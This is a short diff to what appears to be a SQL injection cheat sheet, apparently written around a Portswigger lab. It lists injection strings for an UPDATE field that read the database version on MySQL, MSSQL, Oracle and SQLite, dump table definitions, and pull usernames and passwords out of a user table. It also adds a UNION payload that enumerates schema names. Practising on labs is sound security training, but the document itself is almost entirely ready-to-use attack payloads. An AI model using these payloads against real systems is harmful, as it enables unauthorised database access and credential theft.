@@ -1,9 +1,9 @@
 ## Finding the Database Version
-**MySQL and MSSQL**
-`',nickName=@@version,email='`
-** For Oracle **
+**MySQL and MSSQL** <br>
+`',nickName=@@version,email='` 
+** For Oracle ** <br>
 `',nickName=(SELECT banner FROM v$version),email='`
-** For SQLite **
+** For SQLite ** <br>
 `',nickName=sqlite_version(),email='`
 
 ## Error-Based
@@ -28,6 +28,7 @@ END;`
 * `',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='`
 
 * `',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='`
+* `2 UNION SELECT 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c),4 fRoM information_schema.schemata-- `
 
 ### Portswigger Lab Solution
 
